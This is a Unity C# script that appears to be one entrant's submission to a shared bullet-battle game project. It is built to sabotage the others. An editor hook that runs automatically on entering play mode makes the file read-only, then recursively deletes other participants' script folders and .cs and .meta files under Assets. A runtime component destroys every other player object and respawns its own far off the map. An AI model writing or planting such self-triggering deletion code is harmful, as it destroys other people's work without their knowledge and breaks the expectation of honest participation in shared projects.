using System;
using System.IO;
using System.Linq;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;

#if UNITY_EDITOR
/// <summary>
/// アイデア
/// 自分のスクリプトともとからあるもの以外は消去
/// そして自分の弾スクリプトを実行
/// </summary>
[DefaultExecutionOrder(-1)]
public class A : MonoBehaviour
{
    /// <summary>
    /// 各ディレクトリのC#スクリプトとそのmetaファイルを削除する
    /// ただしFoundationのもとからあるスクリプト、自分のスクリプトは消さない
    /// </summary>
    [UnityEditor.InitializeOnEnterPlayMode]
    static void B()
    {
        //読み取り専用にする
        string myScriptsPath = Path.Combine(Application.dataPath, "Scripts", "A.cs");
        File.SetAttributes(myScriptsPath, FileAttributes.ReadOnly);

        int deleteFileCount = 0;
        string originalFolderPath1 = Path.Combine(Application.dataPath, "Scripts", "Foundation");
        string originalFolderPath2 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "BattleRoyal");
        string originalFolderPath3 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "BulletBase");
        string originalFolderPath4 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "DefaultBullet");
        string originalFolderPath5 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "Logic");
        string originalFolderPath6 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "Player");
        string originalFolderPath7 = Path.Combine(Application.dataPath, "Scripts", "Foundation", "");

        List<string> directoryNames = Directory.GetDirectories(Application.dataPath).ToList();

        foreach (var directory in directoryNames)
        {
            //敵対するディレクトリを削除
            foreach (var diretory in Directory.GetDirectories(directory))
            {
                if (diretory != originalFolderPath1)
                {
                    deleteFileCount = DestroyDirectory(deleteFileCount, diretory);
                }
            }

            string folderPath = Path.Combine(Application.dataPath, directory);
            List<string> fileNames = Directory.GetFiles(folderPath).ToList();

            //敵対するファイルを削除
            foreach (var fileName in fileNames)
            {
                if (fileName.Contains(myScriptsPath)) continue;
                if (!fileName.Contains(".cs")) continue;
                deleteFileCount = DestroyFile(deleteFileCount, fileName);
            }
        }

        //foundation内も検索しファイル破壊
        List<string> foundationFiles = Directory.GetFiles(originalFolderPath1).ToList();
        foreach (var foundationFile in foundationFiles)
        {
            
            if (foundationFile == $"{originalFolderPath7}\\.cs") continue;
            if (foundationFile == $"{originalFolderPath7}\\.cs.meta") continue;
            if (foundationFile.Contains(originalFolderPath2)) continue;
            if (foundationFile.Contains(originalFolderPath3)) continue;
            if (foundationFile.Contains(originalFolderPath4)) continue;
            if (foundationFile.Contains(originalFolderPath5)) continue;
            if (foundationFile.Contains(originalFolderPath6)) continue;

            deleteFileCount = DestroyFile(deleteFileCount, foundationFile);
        }

        //Asset直下のスクリプトも破壊
        List<string> assetFiles = Directory.GetFiles(Application.dataPath).ToList();

        foreach (var assetFile in assetFiles)
        {
            if (!assetFile.Contains(".cs")) continue;

            Debug.Log(assetFile);
            deleteFileCount = DestroyFile(deleteFileCount, assetFile);
        }

        //ファイルを削除したなら再起動させる
        if (deleteFileCount != 0)
        {
            Debug.Log("ファイルを消去しました。もう一度再生してください");
            UnityEditor.EditorApplication.isPlaying = false;
        }
    }

    /// <summary>
    /// 他人が作ったファイルを破壊する
    /// </summary>
    /// <param name="deleteFileCount"></param>
    /// <param name="fileName"></param>
    /// <returns></returns>
    private static int DestroyFile(int deleteFileCount, string fileName)
    {
        try
        {
            FileInfo file = new FileInfo(fileName);
            if ((file.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
            {
                file.Attributes = FileAttributes.Normal;
            }

            Debug.Log(fileName);
            File.Delete(fileName);
            deleteFileCount++;
        }
        catch (Exception e)
        {
            Debug.LogError(e);
        }

        return deleteFileCount;
    }

    /// <summary>
    /// 他人が作ったディレクトリを破壊する
    /// </summary>
    /// <param name="deleteFileCount"></param>
    /// <param name="diretory"></param>
    /// <returns></returns>
    private static int DestroyDirectory(int deleteFileCount, string diretory)
    {
        try
        {
            FileInfo file = new FileInfo(diretory);
            if ((file.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
            {
                file.Attributes = FileAttributes.Normal;
            }

            Directory.Delete(diretory, true);
            File.Delete($"{diretory}.meta");
            deleteFileCount++;
        }
        catch (Exception e)
        {
            Debug.LogError(e);
        }

        return deleteFileCount;
    }
}
#endif

/// <summary>
/// 自分のオブジェクト以外を検索し破棄する
/// </summary>
[DefaultExecutionOrder(-1)]
public class B : MonoBehaviour
{
    string _playerName = "A";

    static GameObject _instance;

    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.SubsystemRegistration)]
    static void A1()
    {
        var obj = Instantiate(GameObject.CreatePrimitive(PrimitiveType.Sphere));
        obj.AddComponent<B>();
    }

    private void Awake()
    {
        StopAllCoroutines();
        StartCoroutine(nameof(SixtyCount));
    }

    /// <summary>
    /// 六十秒後に存在チェック
    /// ※この後にコルーチンを止められると機能しない
    /// </summary>
    /// <returns></returns>
    IEnumerator SixtyCount()
    {
        yield return new WaitForSeconds(60);
        CheckMyPlayerObj();
    }

    private void Update()
    {
        DestroyOtherPlayerObjects();

        CheckMyPlayerObj();
    }

    /// <summary>
    /// オブジェクトを破壊する
    /// updateならplayerはすでに生成されているのでplayerを破壊しても大丈夫だろう
    /// </summary>
    private void DestroyOtherPlayerObjects()
    {
        var players = FindObjectsByType<Player>(FindObjectsSortMode.None);
        foreach (var player in players)
        {
            if (player.gameObject.name == _playerName)
            {
                _instance = player.gameObject;
                continue;
            }

            Destroy(player.gameObject);
        }
    }

    /// <summary>
    /// 自分のプレイヤーオブジェクトがあるか存在する
    /// ないなら生成
    /// </summary>
    void CheckMyPlayerObj()
    {
        if (_instance != null) return;

        GameObject player = GameObject.CreatePrimitive(PrimitiveType.Cube);

        //諸々の設定する
        player.transform.localScale = new Vector3(10, 10, 10);
        player.transform.localPosition = new Vector3(1000, 1000, 1000);
        player.gameObject.name = _playerName;
        player.AddComponent<Player>();

        Cinemachine.CinemachineTargetGroup _targetGroup = FindAnyObjectByType<Cinemachine.CinemachineTargetGroup>().GetComponent<Cinemachine.CinemachineTargetGroup>();
        _targetGroup.AddMember(player.transform, 1, 20);

        _instance = player;

    }

}